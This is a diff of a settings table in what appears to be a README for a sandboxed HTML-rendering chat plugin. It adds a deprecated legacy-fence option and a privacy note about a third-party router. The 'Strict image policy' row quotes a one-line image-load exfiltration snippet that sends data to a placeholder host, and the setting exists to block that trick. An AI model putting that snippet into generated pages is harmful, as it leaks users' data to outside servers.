@@ -13,9 +13,10 @@ Chinese remodel plan: `docs/REDESIGN-SANDBOX-FIRST.zh-CN.md`.
 | Fence repair feedback | on | Same-turn repair hint when a fence fails to render |
 | Format referee | on | Only when the user explicitly asks for a page (build/show verb + visual artifact) and the reply has none → steer toward ```iui-html |
 | Strict image policy | off | Sandbox `img-src` / `font-src` drop the `https:` wildcard: only `data:` / `blob:`, Wikimedia, map tiles and the plugin's own library route. Blocks `new Image().src = "https://x/?d=" + data` exfiltration; arbitrary web images stop loading. Planned default **on** in 0.14 |
+| Legacy fences (deprecated) | off | Render old ```` ```iui ```` / ```` ```dsh-ui ```` fences. Off: they stay code blocks (a settled page body gets a **▶ Render as page** button) and the referee asks the model for ```` ```iui-html ````. Plain ```` ```svg ```` opens on the source tab unless the root is `<svg data-iui…>`. Removed in 0.14 |
 | Custom tokens JSON | — | Optional token overrides for sandbox CSS vars |
 | User templates JSON | — | HTML/CSS/JS starters the user saved |
-| Enable Jev router | **off** | TypeSafe System One format pick; **off without key** |
+| Enable Jev router | **off** | TypeSafe System One format pick; **off without key**. Privacy: when on, each user message's text is sent to the third-party TypeSafe service |
 | TypeSafe API key | — | Secret; empty keeps Jev off |
 | TypeSafe base URL / model | defaults | Optional overrides (`jev-latest`) |
 | Structured Outputs | **auto** | Build/advertise json_schema; degrade to soft fence if unsupported |
